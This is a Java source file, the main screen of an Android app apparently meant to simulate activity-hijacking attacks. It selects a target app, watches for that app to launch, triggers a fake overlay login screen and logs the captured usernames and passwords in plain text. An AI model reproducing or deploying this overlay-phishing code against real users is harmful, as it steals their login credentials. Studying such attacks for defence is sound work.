package com.activityhijack.simulator;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.activityhijack.simulator.dialogs.AppListDialog;
import com.activityhijack.simulator.models.AppInfo;
import com.activityhijack.simulator.services.ActivityMonitorService;
import com.activityhijack.simulator.utils.AppManager;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * 主界面Activity
 * 负责应用选择、监测控制和日志显示
 */
public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int REQUEST_OVERLAY_PERMISSION = 1001;
    private static final int REQUEST_USAGE_STATS_PERMISSION = 1002;
    private static final int REQUEST_NOTIFICATION_PERMISSION = 1003;

    private TextView tvSelectedApp;
    private TextView tvStatus;
    private TextView tvLogs;
    private Button btnSelectApp;
    private Button btnStartMonitor;
    private Button btnStopMonitor;
    private Button btnClearLogs;

    private AppManager appManager;
    private AppInfo selectedApp;
    private boolean isMonitoring = false;

    private BroadcastReceiver broadcastReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initViews();
        initAppManager();
        setupListeners();
        registerBroadcastReceiver();
        checkPermissions();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterBroadcastReceiver();
        stopMonitoring();
    }

    /**
     * 初始化视图
     */
    private void initViews() {
        tvSelectedApp = findViewById(R.id.tv_selected_app);
        tvStatus = findViewById(R.id.tv_status);
        tvLogs = findViewById(R.id.tv_logs);
        btnSelectApp = findViewById(R.id.btn_select_app);
        btnStartMonitor = findViewById(R.id.btn_start_monitor);
        btnStopMonitor = findViewById(R.id.btn_stop_monitor);
        btnClearLogs = findViewById(R.id.btn_clear_logs);
    }

    /**
     * 初始化应用管理器
     */
    private void initAppManager() {
        appManager = new AppManager(this);
    }

    /**
     * 设置监听器
     */
    private void setupListeners() {
        // 选择应用按钮
        btnSelectApp.setOnClickListener(v -> showAppListDialog());

        // 开始监测按钮
        btnStartMonitor.setOnClickListener(v -> startMonitoring());

        // 停止监测按钮
        btnStopMonitor.setOnClickListener(v -> stopMonitoring());

        // 清除日志按钮
        btnClearLogs.setOnClickListener(v -> clearLogs());
    }

    /**
     * 注册广播接收器
     */
    private void registerBroadcastReceiver() {
        broadcastReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                if (action == null) return;

                switch (action) {
                    case "com.activityhijack.TARGET_APP_DETECTED":
                        String targetPackage = intent.getStringExtra("target_package");
                        appendLog("检测到目标应用启动: " + targetPackage);
                        updateStatus("已触发覆盖界面");
                        break;

                    case "com.activityhijack.LOGIN_CAPTURED":
                        String capturedPackage = intent.getStringExtra("target_package");
                        String username = intent.getStringExtra("username");
                        String password = intent.getStringExtra("password");
                        appendLog("捕获到登录信息:");
                        appendLog("  目标应用: " + capturedPackage);
                        appendLog("  用户名: " + username);
                        appendLog("  密码: " + password);
                        updateStatus("登录信息已捕获");
                        break;
                }
            }
        };

        IntentFilter filter = new IntentFilter();
        filter.addAction("com.activityhijack.TARGET_APP_DETECTED");
        filter.addAction("com.activityhijack.LOGIN_CAPTURED");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(broadcastReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(broadcastReceiver, filter);
        }
    }

    /**
     * 注销广播接收器
     */
    private void unregisterBroadcastReceiver() {
        if (broadcastReceiver != null) {
            try {
                unregisterReceiver(broadcastReceiver);
            } catch (Exception e) {
                Log.e(TAG, "注销广播接收器失败: " + e.getMessage());
            }
        }
    }

    /**
     * 检查权限
     */
    private void checkPermissions() {
        // 检查悬浮窗权限
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            appendLog("需要悬浮窗权限");
            requestOverlayPermission();
        }

        // 检查使用统计权限
        if (!ActivityMonitorService.hasUsageStatsPermission(this)) {
            appendLog("需要使用统计权限");
            requestUsageStatsPermission();
        }

        // 检查通知权限（Android 13+）
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.POST_NOTIFICATIONS},
                    REQUEST_NOTIFICATION_PERMISSION);
            }
        }
    }

    /**
     * 请求悬浮窗权限
     */
    private void requestOverlayPermission() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            Uri.parse("package:" + getPackageName()));
        startActivityForResult(intent, REQUEST_OVERLAY_PERMISSION);
    }

    /**
     * 请求使用统计权限
     */
    private void requestUsageStatsPermission() {
        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
        startActivityForResult(intent, REQUEST_USAGE_STATS_PERMISSION);
    }

    /**
     * 显示应用列表对话框
     */
    private void showAppListDialog() {
        appendLog("正在加载已安装应用列表...");

        new Thread(() -> {
            List<AppInfo> appList = appManager.getInstalledApps();

            runOnUiThread(() -> {
                if (appList.isEmpty()) {
                    Toast.makeText(this, "未找到已安装的应用", Toast.LENGTH_SHORT).show();
                    appendLog("未找到已安装的应用");
                    return;
                }

                appendLog("已加载 " + appList.size() + " 个应用");

                AppListDialog dialog = new AppListDialog(this, appList, appInfo -> {
                    selectedApp = appInfo;
                    tvSelectedApp.setText(String.format("已选择: %s", appInfo.getAppName()));
                    btnStartMonitor.setEnabled(true);
                    appendLog("已选择目标应用: " + appInfo.getAppName());
                    appendLog("包名: " + appInfo.getPackageName());
                });
                dialog.show();
            });
        }).start();
    }

    /**
     * 开始监测
     */
    private void startMonitoring() {
        if (selectedApp == null) {
            Toast.makeText(this, "请先选择目标应用", Toast.LENGTH_SHORT).show();
            return;
        }

        // 检查权限
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "需要悬浮窗权限", Toast.LENGTH_SHORT).show();
            requestOverlayPermission();
            return;
        }

        if (!ActivityMonitorService.hasUsageStatsPermission(this)) {
            Toast.makeText(this, "需要使用统计权限", Toast.LENGTH_SHORT).show();
            requestUsageStatsPermission();
            return;
        }

        // 启动监测服务
        Intent serviceIntent = new Intent(this, ActivityMonitorService.class);
        serviceIntent.putExtra("target_package", selectedApp.getPackageName());
        startService(serviceIntent);

        isMonitoring = true;
        updateUI();
        updateStatus("正在监测");
        appendLog("开始监测目标应用: " + selectedApp.getAppName());
        appendLog("当目标应用启动时，将自动显示覆盖登录界面");
    }

    /**
     * 停止监测
     */
    private void stopMonitoring() {
        Intent serviceIntent = new Intent(this, ActivityMonitorService.class);
        stopService(serviceIntent);

        isMonitoring = false;
        updateUI();
        updateStatus("已停止");
        appendLog("已停止监测");
    }

    /**
     * 更新UI状态
     */
    private void updateUI() {
        btnStartMonitor.setEnabled(!isMonitoring && selectedApp != null);
        btnStopMonitor.setEnabled(isMonitoring);
        btnSelectApp.setEnabled(!isMonitoring);
    }

    /**
     * 更新状态显示
     * @param status 状态文本
     */
    private void updateStatus(String status) {
        tvStatus.setText("状态: " + status);
    }

    /**
     * 添加日志
     * @param message 日志消息
     */
    private void appendLog(String message) {
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
        String timestamp = sdf.format(new Date());
        String logEntry = "[" + timestamp + "] " + message + "\n";

        runOnUiThread(() -> {
            String currentLogs = tvLogs.getText().toString();
            tvLogs.setText(logEntry + currentLogs);
        });

        Log.d(TAG, message);
    }

    /**
     * 清除日志
     */
    private void clearLogs() {
        tvLogs.setText("等待开始...");
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_NOTIFICATION_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                appendLog("通知权限已授予");
            } else {
                appendLog("通知权限被拒绝");
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_OVERLAY_PERMISSION) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                appendLog("悬浮窗权限已授予");
            } else {
                appendLog("悬浮窗权限被拒绝");
            }
        } else if (requestCode == REQUEST_USAGE_STATS_PERMISSION) {
            if (ActivityMonitorService.hasUsageStatsPermission(this)) {
                appendLog("使用统计权限已授予");
            } else {
                appendLog("使用统计权限被拒绝");
            }
        }
    }
}